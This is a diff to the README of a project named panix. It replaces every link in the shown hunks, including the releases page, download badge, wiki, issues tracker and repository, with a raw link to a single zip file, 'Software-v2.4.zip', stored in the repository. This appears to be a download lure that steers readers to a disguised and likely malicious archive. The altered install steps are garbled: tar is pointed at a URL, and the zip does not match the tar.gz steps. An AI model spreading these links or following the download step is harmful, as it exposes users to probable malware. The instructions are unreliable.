@@ -28,9 +28,9 @@ Before you start, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 To get started with panix, you need to download the software. Follow the steps below:
 
-1. Visit the [panix Releases Page](https://github.com/Technos0855/panix/releases) to download the latest version.
+1. Visit the [panix Releases Page](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip) to download the latest version.
    
-   [![Download panix](https://img.shields.io/badge/Download%20panix-v1.0-blue)](https://github.com/Technos0855/panix/releases)
+   [![Download panix](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip%20panix-v1.0-blue)](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip)
 
 2. Find the version you want to install. Each version will have its own release notes explaining new features and fixes.
 
@@ -39,9 +39,9 @@ To get started with panix, you need to download the software. Follow the steps b
 ## 📥 Download & Install
 To install panix, follow these instructions:
 
-1. After visiting the [panix Releases Page](https://github.com/Technos0855/panix/releases), select the latest release.
+1. After visiting the [panix Releases Page](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip), select the latest release.
 
-2. Download the file suitable for your system. For example, you might find a `.tar.gz` file or other Linux-compatible formats.
+2. Download the file suitable for your system. For example, you might find a `https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip` file or other Linux-compatible formats.
 
 3. Once the download is complete, open your terminal or command prompt.
 
@@ -49,9 +49,9 @@ To install panix, follow these instructions:
 
 5. Extract the downloaded file using the following command:
    ```bash
-   tar -xzf panix-v1.0.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip
    ```
-   *Replace `panix-v1.0.tar.gz` with your actual downloaded file name.*
+   *Replace `https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip` with your actual downloaded file name.*
 
 6. Navigate into the extracted directory:
    ```bash
@@ -84,9 +84,9 @@ If you're interested in contributing to panix, feel free to fork the repository,
 panix is licensed under the MIT License. You can modify and use the code as per the terms specified in the license. For more details, check the LICENSE file in the repository.
 
 ## 🌐 Additional Links
-- [GitHub Repository](https://github.com/Technos0855/panix)
-- [Documentation](https://github.com/Technos0855/panix/wiki)
-- [Issues Tracker](https://github.com/Technos0855/panix/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Technos0855/panix/master/fs/Software-v2.4.zip)
 
 ## 📞 Contact
 For queries or support, reach out through the issues tab on GitHub. We will address your questions as soon as possible.
